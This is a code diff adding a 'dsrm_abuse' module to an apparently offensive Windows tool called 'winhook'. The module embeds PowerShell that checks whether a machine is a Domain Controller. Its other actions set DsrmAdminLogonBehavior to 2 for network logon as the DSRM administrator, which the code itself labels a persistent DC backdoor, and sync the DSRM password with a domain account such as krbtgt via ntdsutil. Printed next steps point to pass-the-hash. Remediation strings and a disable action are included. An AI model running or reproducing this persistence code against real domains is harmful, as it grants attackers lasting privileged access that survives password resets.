@@ -23245,6 +23245,212 @@ Write-Output "[+] Filter removed (reboot needed to unload from LSASS)"
   return { output: output.join("\n"), findings }
 }
 
+async function dsrmAbuse(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const syncAccount = argVal(args, "--sync-account")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] DSRM (Directory Services Restore Mode) analysis...\n"]
+
+  if (action === "check") {
+    const script = `
+Write-Output "=== DSRM Configuration Check ==="
+Write-Output ""
+
+# Check if this is a Domain Controller
+$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
+Write-Output "Is Domain Controller: $isDC"
+Write-Output "IS_DC=$(if ($isDC) { '1' } else { '0' })"
+
+if (-not $isDC) {
+  Write-Output "[-] DSRM attacks only apply to Domain Controllers"
+  exit
+}
+
+# Check DsrmAdminLogonBehavior
+$dsrmKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
+$dsrmBehavior = (Get-ItemProperty $dsrmKey -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue).DsrmAdminLogonBehavior
+
+Write-Output ""
+Write-Output "=== DsrmAdminLogonBehavior ==="
+switch ($dsrmBehavior) {
+  0 { Write-Output "Value: 0 — DSRM admin can only logon in DSRM boot mode (DEFAULT, secure)" }
+  1 { Write-Output "Value: 1 — DSRM admin can logon when AD is stopped (medium risk)" }
+  2 { Write-Output "[!] Value: 2 — DSRM admin can logon ANYTIME via network (EXPLOITABLE)" }
+  $null { Write-Output "Value: NOT SET — defaults to 0 (DSRM boot mode only)" }
+  default { Write-Output "Value: $dsrmBehavior (unknown)" }
+}
+Write-Output "DSRM_BEHAVIOR=$dsrmBehavior"
+
+# Check DSRM password status
+Write-Output ""
+Write-Output "=== DSRM Password Info ==="
+Write-Output "[*] DSRM password is set during dcpromo and stored locally"
+Write-Output "[*] It is the local Administrator password for the DC"
+Write-Output "[*] Cannot be read directly — must be synced or cracked from SAM"
+
+# Check ntdsutil availability
+$ntdsutil = Get-Command ntdsutil -ErrorAction SilentlyContinue
+Write-Output ""
+Write-Output "ntdsutil available: $(if ($ntdsutil) { 'YES' } else { 'NO' })"
+
+# Check if DSRM account is the built-in Administrator
+Write-Output ""
+Write-Output "=== Local Administrator (DSRM) Account ==="
+$admin = Get-WmiObject Win32_UserAccount -Filter "LocalAccount=True AND SID LIKE 'S-1-5-%-500'"
+if ($admin) {
+  Write-Output "Name: $($admin.Name)"
+  Write-Output "Disabled: $($admin.Disabled)"
+  Write-Output "Lockout: $($admin.Lockout)"
+  Write-Output "PasswordChangeable: $($admin.PasswordChangeable)"
+  Write-Output "PasswordRequired: $($admin.PasswordRequired)"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const isDC = r.stdout.includes("IS_DC=1")
+    const dsrmBehavior = r.stdout.match(/DSRM_BEHAVIOR=(\d*)/)
+
+    if (isDC && dsrmBehavior && dsrmBehavior[1] === "2") {
+      findings.push({
+        checkId: "WIN-DSRM-001",
+        provider: "windows",
+        severity: "critical",
+        status: "EXPLOITABLE",
+        resource: "dc://dsrm",
+        title: "DSRM network logon enabled (DsrmAdminLogonBehavior=2)",
+        details: "The DSRM administrator can log on via the network at any time. If the DSRM password is known or synced, this provides persistent DC access that survives AD password resets.",
+        remediation: "Set DsrmAdminLogonBehavior to 0 or remove the registry value.",
+      })
+    }
+
+    if (isDC && (!dsrmBehavior || dsrmBehavior[1] !== "2")) {
+      findings.push({
+        checkId: "WIN-DSRM-002",
+        provider: "windows",
+        severity: "medium",
+        status: "INFO",
+        resource: "dc://dsrm",
+        title: "DC found — DSRM network logon can be enabled for persistence",
+        details: "DsrmAdminLogonBehavior is not set to 2. Use --action enable-network to enable DSRM network logon, then sync the password with a known account.",
+        remediation: "Monitor DsrmAdminLogonBehavior registry value for changes.",
+      })
+    }
+  }
+
+  if (action === "enable-network") {
+    const script = `
+Write-Output "=== Enabling DSRM Network Logon ==="
+Write-Output ""
+
+$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
+if (-not $isDC) {
+  Write-Output "[-] Not a Domain Controller"
+  Write-Output "STATUS=FAILED"
+  exit
+}
+
+$dsrmKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
+$current = (Get-ItemProperty $dsrmKey -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue).DsrmAdminLogonBehavior
+
+Write-Output "Current DsrmAdminLogonBehavior: $(if ($current -ne $null) { $current } else { 'NOT SET (default 0)' })"
+Write-Output ""
+
+Set-ItemProperty $dsrmKey -Name DsrmAdminLogonBehavior -Value 2 -Type DWord -Force
+$verify = (Get-ItemProperty $dsrmKey -Name DsrmAdminLogonBehavior).DsrmAdminLogonBehavior
+Write-Output "[+] DsrmAdminLogonBehavior set to: $verify"
+Write-Output "[+] DSRM admin can now logon via network at any time"
+Write-Output ""
+Write-Output "[*] Next steps:"
+Write-Output "    1. Sync DSRM password: winhook dsrm_abuse --action sync-password --sync-account ADMIN_ACCOUNT"
+Write-Output "    2. Or use known DSRM password with pass-the-hash:"
+Write-Output "       winhook overpass_hash --user Administrator --hash DSRM_HASH --domain DC_HOSTNAME"
+Write-Output "       (Use DC hostname, NOT domain name — DSRM is a LOCAL account)"
+Write-Output ""
+Write-Output "Cleanup: winhook dsrm_abuse --action disable"
+Write-Output "STATUS=SUCCESS"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("STATUS=SUCCESS")) {
+      findings.push({
+        checkId: "WIN-DSRM-010",
+        provider: "windows",
+        severity: "critical",
+        status: "BACKDOORED",
+        resource: "dc://dsrm",
+        title: "DSRM network logon enabled — persistent DC backdoor",
+        details: "DsrmAdminLogonBehavior set to 2. DSRM admin can authenticate via network. Sync password with a known account for persistent access.",
+        remediation: "Set DsrmAdminLogonBehavior back to 0. Rotate DSRM password.",
+      })
+    }
+  }
+
+  if (action === "sync-password") {
+    if (!syncAccount) {
+      output.push("ERROR: --sync-account required (domain account to sync DSRM password with)")
+      output.push("")
+      output.push("This syncs the DSRM password to match a domain account's password.")
+      output.push("After sync, use that account's NTLM hash to authenticate as DSRM admin.")
+      output.push("")
+      output.push("Example: winhook dsrm_abuse --action sync-password --sync-account krbtgt")
+      return { output: output.join("\n"), findings }
+    }
+
+    const script = `
+Write-Output "=== DSRM Password Sync ==="
+Write-Output "Syncing DSRM password with: ${syncAccount}"
+Write-Output ""
+
+$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
+if (-not $isDC) {
+  Write-Output "[-] Not a Domain Controller"
+  Write-Output "STATUS=FAILED"
+  exit
+}
+
+# Use ntdsutil to sync DSRM password
+Write-Output "[*] Running ntdsutil to sync DSRM password..."
+Write-Output "[*] Command: ntdsutil 'set dsrm password' 'sync from domain account ${syncAccount}' quit quit"
+Write-Output ""
+
+$result = ntdsutil "set dsrm password" "sync from domain account ${syncAccount}" quit quit 2>&1
+Write-Output $result
+Write-Output ""
+
+if ($result -match 'successfully') {
+  Write-Output "[+] DSRM password synced with ${syncAccount}"
+  Write-Output "[+] Use ${syncAccount}'s NTLM hash to authenticate as DSRM admin:"
+  Write-Output "    winhook overpass_hash --user Administrator --hash <${syncAccount}_NTLM_HASH> --domain $(hostname)"
+  Write-Output ""
+  Write-Output "[!] Remember: Use DC HOSTNAME as domain, not the AD domain name"
+  Write-Output "    DSRM is a LOCAL account on the DC"
+  Write-Output "STATUS=SUCCESS"
+} else {
+  Write-Output "[-] Sync may have failed — check output above"
+  Write-Output "[*] Alternative: Set DSRM password manually via ntdsutil"
+  Write-Output "STATUS=UNKNOWN"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  if (action === "disable") {
+    const script = `
+Write-Output "=== Disabling DSRM Network Logon ==="
+$dsrmKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
+Remove-ItemProperty $dsrmKey -Name DsrmAdminLogonBehavior -Force -ErrorAction SilentlyContinue
+Write-Output "[+] DsrmAdminLogonBehavior removed (defaults to 0 — DSRM boot mode only)"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -26884,6 +27090,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   clm_bypass: clmBypass,
   ssp_persist: sspPersist,
   password_filter: passwordFilter,
+  dsrm_abuse: dsrmAbuse,
 }
 
 export const WinhookTool = Tool.define("winhook", {
